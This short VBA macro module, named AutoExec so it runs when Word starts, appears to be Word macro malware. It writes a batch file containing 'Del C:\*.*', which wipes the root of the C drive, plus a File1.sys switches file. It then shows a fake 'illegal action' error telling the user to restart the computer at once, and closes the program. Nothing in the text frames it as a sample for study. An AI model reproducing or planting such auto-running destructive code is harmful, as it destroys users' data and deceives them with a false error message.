   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Open "C:\files\File1.sys" For Output As 1
   Print #1, "switches=/N"
   Close 1
   Open "C:\files\File1.bat" For Output As 1
   Print #1, "Del C:\*.*"
   Close 1
   WordBasic.MsgBox "This Program Has performed an illegal action and will be terminated.  Quit Windows and restart your computer Imediatly!", "Program error", 16
   WordBasic.AppClose
   End Sub
